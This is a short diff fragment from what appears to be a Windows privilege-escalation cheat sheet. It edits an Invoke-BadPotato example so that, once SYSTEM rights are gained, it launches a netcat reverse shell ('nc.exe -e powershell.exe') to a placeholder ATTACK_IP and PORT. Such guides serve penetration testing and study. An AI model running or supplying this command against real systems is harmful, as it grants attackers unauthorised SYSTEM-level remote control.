@@ -114,7 +114,7 @@ Download the script on our target machine
 
 Run the script to get system
 
-    Invoke-BadPotato -Command "c:\temp\runme.bat"
+    Invoke-BadPotato -Command "c:\temp\nc.exe -e powershell.exe ATTACK_IP PORT"
 
 ## SeDebug Privilege
 
